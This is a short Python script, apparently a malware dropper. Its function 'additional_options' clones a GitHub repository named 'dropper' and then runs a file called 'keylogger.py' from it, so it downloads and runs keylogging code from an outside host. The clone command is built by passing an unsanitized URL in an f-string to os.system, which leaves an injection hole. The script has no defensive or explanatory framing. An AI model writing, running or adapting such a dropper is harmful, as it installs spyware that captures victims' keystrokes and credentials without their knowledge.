import os
import subprocess

def clone_repository(repository_url):
    try:
        os.system(f'git clone {repository_url}')
        print("Repository cloned successfully!")
    except Exception as e:
        print("Error cloning repository:", e)

def run_file_from_repository(file_path):
    try:
        subprocess.run(['python3', file_path], cwd='dropper')  # Run the file in 'dropper' directory
    except Exception as e:
        print("Error running the file:", e)

def additional_options():
    repository_url = 'https://github.com/001daemon/dropper'  # Replace with the actual repository URL
    clone_repository(repository_url)
    
    file_to_run = 'keylogger.py'  # Replace 'main.py' with the path to the file you want to run
    run_file_from_repository(file_to_run)
